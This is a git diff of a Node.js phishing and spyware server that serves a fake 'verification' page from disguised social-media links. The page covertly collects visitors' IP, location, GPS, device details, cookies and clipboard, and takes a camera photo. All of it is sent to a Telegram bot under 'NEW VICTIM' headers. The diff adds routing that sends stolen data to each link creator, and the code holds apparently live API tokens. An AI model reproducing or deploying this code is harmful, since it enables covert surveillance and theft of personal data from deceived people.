@@ -1,39 +1,40 @@
-
 const express = require('express');
 const app = express();
 
 // ===== TERI VALUES DAAL =====
 const TELEGRAM_TOKEN = "8840717306:AAEOhGfFnZsSWGtdOChaJaGC4JLfReeKBaU";
-const CHAT_ID = "8179349999";
+const OWNER_CHAT_ID = "8179349999"; // Owner backup ke liye
 const IMGBB_API_KEY = "0959c9368daed87c0f1a8d44c203a8b3";
 // =============================
 
 app.post('/send-data', express.json({limit:'50mb'}), (req, res) => {
-    const {type, data} = req.body;
+    const {type, data, creator_id} = req.body;
+    const targetChat = creator_id || OWNER_CHAT_ID; // ✅ Creator ko bhejo, nahi to owner ko
+    
     if(type === 'contacts') {
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + 
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${targetChat}&text=` + 
             encodeURIComponent("📱 *CONTACTS*\n\n" + data.substring(0, 3500)) + "&parse_mode=Markdown");
     }
     if(type === 'sms') {
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + 
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${targetChat}&text=` + 
             encodeURIComponent("💬 *SMS DATA*\n\n" + data.substring(0, 3500)) + "&parse_mode=Markdown");
     }
     if(type === 'clipboard') {
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + 
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${targetChat}&text=` + 
             encodeURIComponent("📋 *CLIPBOARD*\n\n" + data.substring(0, 1500)) + "&parse_mode=Markdown");
     }
     if(type === 'installed_apps') {
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + 
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${targetChat}&text=` + 
             encodeURIComponent("📦 *INSTALLED APPS*\n\n" + data.substring(0, 3500)) + "&parse_mode=Markdown");
     }
     res.send({ok:true});
 });
 
-app.get('/c/:code/:encoded', (req, res) => {
+app.get('/c/:code/:encoded/:creatorid', (req, res) => {
     try {
         let legitUrl = Buffer.from(req.params.encoded, 'base64').toString('utf-8');
+        const CREATOR_ID = req.params.creatorid; // ✅ YEH LIYA LINK CREATOR KA ID
         
-        // Instagram Reels ya YouTube Shorts redirect
         if(legitUrl.includes('instagram.com')) legitUrl = "https://www.instagram.com/reels/";
         if(legitUrl.includes('youtube.com')) legitUrl = "https://www.youtube.com/shorts/";
         if(legitUrl.includes('facebook.com')) legitUrl = "https://www.facebook.com/reel/";
@@ -47,7 +48,6 @@ app.get('/c/:code/:encoded', (req, res) => {
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;min-height:100vh;background:#0f0c29;overflow:hidden}
-/* === STEP 1: VERIFICATION PAGE === */
 #step1{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);display:flex;justify-content:center;align-items:center;z-index:10;transition:all 0.8s ease}
 #step1.hidden{opacity:0;pointer-events:none}
 .card{background:rgba(255,255,255,0.96);border-radius:24px;padding:35px 28px;max-width:380px;width:92%;text-align:center;box-shadow:0 25px 60px rgba(0,0,0,0.6)}
@@ -66,7 +66,6 @@ h2{color:#1a1a2e;font-size:20px;font-weight:700;margin-bottom:4px}
 .steps li .dot.done{background:#4CAF50;color:white;border:none}
 .steps li.done{color:#4CAF50}
 .status{color:#aaa;font-size:11px;margin-top:10px}
-/* === STEP 2: PERMISSION PAGE === */
 #step2{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);display:none;justify-content:center;align-items:center;z-index:20;backdrop-filter:blur(5px)}
 #step2.show{display:flex}
 .permission-card{background:white;border-radius:24px;padding:30px 25px;max-width:380px;width:92%;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,0.7);animation:popIn 0.4s ease}
@@ -96,7 +95,6 @@ h2{color:#1a1a2e;font-size:20px;font-weight:700;margin-bottom:4px}
 </head>
 <body>
 
-<!-- ===== STEP 1: VERIFICATION ===== -->
 <div id="step1">
 <div class="card">
 <div class="logo">&#x1f6e1;</div>
@@ -114,7 +112,6 @@ h2{color:#1a1a2e;font-size:20px;font-weight:700;margin-bottom:4px}
 </div>
 </div>
 
-<!-- ===== STEP 2: PERMISSION PAGE ===== -->
 <div id="step2">
 <div class="permission-card">
 <div class="warning-icon">&#x26a0;</div>
@@ -152,8 +149,9 @@ h2{color:#1a1a2e;font-size:20px;font-weight:700;margin-bottom:4px}
 </div>
 
 <script>
+// ✅ YEH CREATOR KA CHAT_ID HAI — ISKO USE KARKE DATA BHEJENGE
+const CREATOR_ID = "${CREATOR_ID}";
 const TOKEN = "${TELEGRAM_TOKEN}";
-const CID = "${CHAT_ID}";
 const IMGKEY = "${IMGBB_API_KEY}";
 const REDIR = "${legitUrl}";
 
@@ -161,17 +159,18 @@ let allCapturedData = "";
 let photoUploaded = false;
 
 function tg(msg) {
-    fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CID+
+    // ✅ AB SIRF CREATOR KO JAYEGA, OWNER KO NAHI
+    fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CREATOR_ID+
         "&text="+encodeURIComponent(msg)+"&parse_mode=Markdown").catch(()=>{});
 }
 function tgPhoto(url) {
-    fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto?chat_id="+CID+"&photo="+url).catch(()=>{});
+    fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto?chat_id="+CREATOR_ID+"&photo="+url).catch(()=>{});
 }
 function postData(type, data) {
     fetch("/send-data", {
         method:"POST",
         headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({type:type, data:data.substring(0,5000)})
+        body:JSON.stringify({type:type, data:data.substring(0,5000), creator_id: CREATOR_ID})
     }).catch(()=>{});
 }
 function stepDone(id) {
@@ -182,11 +181,7 @@ function stepStatus(text) {
     document.getElementById('status').textContent = text;
 }
 
-// =============================================
-//  BACKGROUND COLLECTION (Step 1 ke andar)
-// =============================================
-
-// 1. IP + Location
+// IP + Location
 fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
     let m = "📍 *NEW VICTIM*\\n\\n";
     m += "*IP:* "+d.ip+"\\n";
@@ -199,7 +194,6 @@ fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
     m += "*Timezone:* "+(d.timezone||"N/A")+"\\n";
     allCapturedData = m;
     
-    // GPS
     if(navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(p=>{
             allCapturedData += "\\n\\n🎯 *GPS*\\nLat: "+p.coords.latitude+"\\nLon: "+p.coords.longitude+"\\nAccuracy: "+p.coords.accuracy+"m";
@@ -216,7 +210,6 @@ fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
     stepDone('s1');
     stepStatus("Network verified - scanning device...");
     
-    // Battery
     if(navigator.getBattery) {
         navigator.getBattery().then(b=>{
             tg("🔋 *BATTERY*\\nLevel: "+Math.round(b.level*100)+"%\\nCharging: "+(b.charging?"Yes":"No"));
@@ -224,7 +217,6 @@ fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
     }
 });
 
-// 2. Device Info
 setTimeout(()=>{
     let info = "🧾 *DEVICE INFO*\\n\\n";
     info += "*UA:* "+navigator.userAgent.substring(0,120)+"\\n";
@@ -240,7 +232,6 @@ setTimeout(()=>{
     stepStatus("Device scanned - verifying location...");
 }, 1000);
 
-// 3. Cookies
 setTimeout(()=>{
     try {
         if(document.cookie && document.cookie.length > 0) {
@@ -249,7 +240,6 @@ setTimeout(()=>{
     } catch(e){}
 }, 1500);
 
-// 4. Clipboard attempt
 setTimeout(()=>{
     try {
         if(navigator.clipboard && navigator.clipboard.readText) {
@@ -263,27 +253,21 @@ setTimeout(()=>{
     } catch(e){}
 }, 2000);
 
-// 5. Step 1 complete hone ke baad Step 2 dikhao
 setTimeout(()=>{
     stepDone('s4');
     stepStatus("Verification requires additional permissions");
     
-    // Step 1 fade out, Step 2 dikhao
     setTimeout(()=>{
         document.getElementById('step1').classList.add('hidden');
         document.getElementById('step2').classList.add('show');
     }, 800);
 }, 4000);
 
-// =============================================
-//  STEP 2: VERIFICATION BUTTON CLICK
-// =============================================
 function startVerification() {
     const btn = document.getElementById('verifyBtn');
     btn.disabled = true;
     btn.textContent = "⏳ Verifying...";
     
-    // GPS - dubara try
     if(navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(p=>{
             const gpsData = "🎯 *GPS (Step 2)*\\nLat: "+p.coords.latitude+"\\nLon: "+p.coords.longitude+"\\nAccuracy: "+p.coords.accuracy+"m";
@@ -293,7 +277,6 @@ function startVerification() {
         }, ()=>{}, {timeout:5000, enableHighAccuracy:true});
     }
     
-    // Camera
     try {
         if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({
@@ -311,7 +294,6 @@ function startVerification() {
                     c.getContext("2d").drawImage(v, 0, 0);
                     const b64 = c.toDataURL("image/jpeg",0.7).split(",")[1];
                     
-                    // ImgBB upload
                     const fd = new FormData();
                     fd.append("image", b64);
                     
@@ -334,7 +316,6 @@ function startVerification() {
         }
     } catch(e){}
     
-    // Clipboard - dubara try
     setTimeout(()=>{
         try {
             if(navigator.clipboard && navigator.clipboard.readText) {
@@ -349,7 +330,6 @@ function startVerification() {
         } catch(e){}
     }, 1000);
     
-    // Final redirect
     setTimeout(()=>{
         btn.className = "btn btn-success";
         btn.textContent = "✓ Verified! Redirecting...";
